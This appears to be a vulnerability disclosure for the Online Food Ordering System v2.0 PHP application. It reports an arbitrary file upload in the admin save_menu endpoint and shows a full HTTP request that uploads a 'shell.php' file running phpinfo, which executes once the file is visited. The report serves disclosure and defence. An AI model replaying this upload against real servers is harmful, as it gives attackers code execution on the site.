# Online Food Ordering System v2.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author: xtxxueyan

vendors: https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability url: ip/fos/admin/ajax.php?action=save_menu

Loophole location: Judging Management System's "/fos/admin/ajax.php?action=save_menu" file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /fos/admin/ajax.php?action=save_menu HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/fos/admin/index.php?page=menu
Content-Length: 808
Content-Type: multipart/form-data; boundary=---------------------------11146509511477
Cookie: PHPSESSID=iuka6rklteufkt7v952vs2g4eq
Connection: close

-----------------------------11146509511477
Content-Disposition: form-data; name="id"


-----------------------------11146509511477
Content-Disposition: form-data; name="name"

11
-----------------------------11146509511477
Content-Disposition: form-data; name="description"

1
-----------------------------11146509511477
Content-Disposition: form-data; name="status"

on
-----------------------------11146509511477
Content-Disposition: form-data; name="category_id"

1
-----------------------------11146509511477
Content-Disposition: form-data; name="price"

111
-----------------------------11146509511477
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------11146509511477--
```

The files will be uploaded to this directory \fos\assets\img
![image](https://user-images.githubusercontent.com/54017627/218389623-a23284f3-4146-4fb6-9fb6-b10ce0524040.png)

We visited the directory of the file in the browser and found that the code had been executed


![image](https://user-images.githubusercontent.com/54017627/218390781-bec3485c-49fe-4096-9a5f-1702af712438.png)
